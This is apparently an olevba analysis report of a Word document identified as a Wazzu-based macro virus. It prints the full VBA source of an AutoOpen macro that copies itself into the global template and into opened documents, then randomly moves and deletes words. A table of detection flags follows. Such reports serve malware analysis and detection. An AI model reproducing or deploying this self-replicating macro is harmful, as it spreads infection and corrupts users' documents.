olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-7b212daf2f7f898ea0515cfc9da7aaad5db12f9f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-7b212daf2f7f898ea0515cfc9da7aaad5db12f9f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu-based-7b212daf2f7f898ea0515cfc9da7aaad5db12f9f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FileMacro$
Dim GlobMacro$
Dim MacroFile$
On Error GoTo -1: On Error GoTo HITCH
WordBasic.FileSummaryInfo Update:=1
Dim ABC As Object: Set ABC = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo ABC
FileMacro$ = ABC.Directory + "\" + ABC.FileName + ":AutoOpen"
GlobMacro$ = "Global:AutoOpen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If MacroFile$ = "NORMAL.DOT" Then
WordBasic.MacroCopy GlobMacro$, FileMacro$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy FileMacro$, GlobMacro$
End If
POINTER
GoTo SEEYA
HITCH:
SEEYA:
On Error GoTo -1: On Error GoTo 0
End Sub
Private Sub POINTER()
Dim A
Dim SelWord$
For A = 1 To 3
If Rnd() < 0.2 Then
RANDOMWORD
WordBasic.SelectCurWord
SelWord$ = WordBasic.[Selection$]()
WordBasic.DeleteWord
RANDOMWORD
WordBasic.Insert SelWord$ + " "
End If
Next
If Rnd() < 0.25 Then
RANDOMWORD
WordBasic.StartOfDocument
End If
End Sub
Private Sub RANDOMWORD()
Dim WordNum
WordBasic.FileSummaryInfo Update:=1
Dim ABC As Object: Set ABC = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics ABC
WordNum = WordBasic.Int(Rnd() * WordBasic.Val(ABC.Words))
WordBasic.StartOfDocument
WordBasic.WordRight WordNum
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

